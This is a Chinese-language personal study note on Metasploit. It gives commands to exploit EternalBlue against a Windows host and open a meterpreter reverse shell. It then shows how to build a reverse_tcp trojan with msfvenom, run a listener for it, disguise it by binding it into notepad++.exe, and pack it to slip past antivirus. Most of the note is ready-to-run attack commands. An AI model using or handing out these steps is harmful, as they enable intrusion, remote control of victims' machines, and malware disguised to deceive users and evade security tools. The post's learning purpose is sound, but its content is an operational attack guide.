---
title: 网安学习笔记——MSF
date: 2025-08-19 15:59:08
categories: 网安
index_img: https://pic1.imgdb.cn/item/68abb87058cb8da5c8493bf5.png
tags: 
- 渗透 
- Metasploit

---

# Metasploit 攻击永恒之蓝全流程
## 一、流程概述
利用 Metasploit 框架，通过永恒之蓝（`ms17_010_eternalblue` ）漏洞对目标 Windows 主机实施攻击，获取 Meterpreter 会话，实现后渗透测试，需合理配置攻击模块参数，涵盖目标与攻击方网络信息、攻击载荷等 。

## 二、具体步骤
### （一）选择攻击模块
在 Metasploit 中，调用永恒之蓝漏洞对应的攻击模块，命令如下：  
```
use exploit/windows/smb/ms17_010_eternalblue
```
该模块针对 Windows SMB 服务，利用永恒之蓝漏洞发起攻击 。  

### （二）查看并配置必选项
1. **查看必选参数**  
    输入 `show options` 命令，筛选 `required` 为 `yes` 的配置项，明确需手动设置的参数，确保攻击流程完整 。  

2. **设置目标主机（RHOSTS）**  
    命令：`set RHOSTS 192.168.1.128`  
    说明：`RHOSTS` 定义攻击目标，填写目标 Windows 主机的 IP 地址，指定要渗透的对象 。  

3. **设置攻击载荷（Payload）**  
    命令：`set payload windows/x64/meterpreter/reverse_tcp`  
    说明：`payload` 决定攻击成功后的行为，选择此载荷可获取 `meterpreter` 交互环境，它是 Metasploit 后渗透阶段的核心工具，支持文件操作、权限提升等多种渗透动作 。  

  ![](https://pic1.imgdb.cn/item/68a48e8058cb8da5c83a622c.png)

4. **设置攻击方监听信息**  
    - **配置监听主机（LHOST）**  
    命令：`set LHOST 192.168.1.136`  
    说明：`LHOST` 为攻击方（Kali 系统）的 IP 地址，用于接收目标主机回连的网络标识 。  
    - **配置监听端口（LPORT）**  
    命令：`set LPORT 12345`  
    说明：`LPORT` 是攻击方在 Kali 上开启的监听端口（范围 1 - 65535 ，需未被系统占用 ），目标主机通过该端口与攻击方建立连接 。  

# 使用Kali生成远控木马及免杀
## 一、生成远控木马流程
### （一）利用msfvenom生成后门程序
`msfvenom` 用于生成后门，在目标机执行后，本地监听可实现远控 ，在shell环境使用，而非`msfconsole`终端。  
命令格式（Windows可执行程序后门）：  

```bash
msfvenom -p [payload] lhost=[本地IP] lport=[本地端口] -f [输出格式] -o [输出文件名]
```
示例：  
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.123.136 lport=9999 -f exe -o demo.exe
```
参数解析：  
- `payload` ：如`windows/x64/meterpreter/reverse_tcp` ，指定系统、架构、作用方式  
- `lhost` ：本地监听IP，即攻击者机器IP  
- `lport` ：本地监听端口，自定义设置  
- `f` ：输出文件格式，`exe` 对应Windows可执行文件  
- `o` ：设置输出文件名  

![](https://pic1.imgdb.cn/item/68a8074e58cb8da5c8425e3c.png)

### （二）开启监听等待上线
在`msfconsole`中操作，用于监听目标机连接：  
1. 选择模块：`use exploit/multi/handler`  
2. 设置payload：`set payload windows/x64/meterpreter/reverse_tcp`  
3. 配置本地IP：`set lhost 192.168.123.136`（与生成木马时一致 ）  
4. 配置监听端口：`set lport 9999`（与生成木马时一致 ）  
5. 启动监听：`run`  

![](https://pic1.imgdb.cn/item/68a807c158cb8da5c8425e70.png)

## 二、免杀处理（躲避杀毒软件查杀）
### （一）捆绑木马
将木马与正常程序捆绑，伪装降低查杀概率。  
命令格式：  

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[本地IP] lport=[本地端口] -f exe -x [正常程序路径] -o [输出文件名]
```
示例：  
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=9999 -f exe -x notepad++.exe -o notepad++.exe
```
`-x` 参数用于指定捆绑的正常程序（如系统常见的`notepad++.exe` ）  

### （二）加壳免杀
通过加压缩壳、加密壳等方式修改程序特征，躲避查杀。不同杀毒软件检测逻辑不同，需自行测试效果，如部分加壳后可通过“火绒安全”病毒查杀（显示“本次扫描未发现风险” ） ，常见加壳工具可辅助实现压缩壳、加密壳添加操作。 



